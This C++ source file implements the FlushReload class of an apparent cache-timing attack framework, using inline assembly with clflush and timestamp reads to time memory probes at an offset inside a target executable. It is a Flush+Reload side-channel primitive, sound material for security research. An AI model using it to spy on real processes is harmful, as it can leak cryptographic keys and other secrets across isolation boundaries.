#include "flush_reload.hpp"

using FR=FlushReload;

#define FLUSH_RELOAD_STR "movl (%1), %%eax"

unsigned int FR::time_hit(void* addr) const {

	unsigned int time=0;

	asm volatile (
			"movl (%1), %%eax\n"
			CTA_ASM_RDTSC_OP(FLUSH_RELOAD_STR)

			: "=a"(time)
			: "c"(addr)
			: "%esi", "%edi"
		);

	return time;
}

unsigned int FR::time_miss(void* addr) const {

	unsigned int time=0;

	asm volatile (
			"clflush (%1)\n"
			CTA_ASM_RDTSC_OP(FLUSH_RELOAD_STR)

			: "=a"(time)
			: "c"(addr)
			: "%esi", "%edi"
		);

	return time;
}

unsigned int FR::probe(void* addr) const {

	unsigned int time=0;

	flush();
	sched_yield();

	asm volatile (
			CTA_ASM_RDTSC_OP(FLUSH_RELOAD_STR)

			: "=a"(time)
			: "c"(addr)
			: "%esi", "%edi"
		);

	return time;
}

FR::FlushReload(const char* exec, unsigned int offset) :
	CacheTimingAttack(exec, offset){};

FR::FlushReload(const FR& other) : CacheTimingAttack(other){};
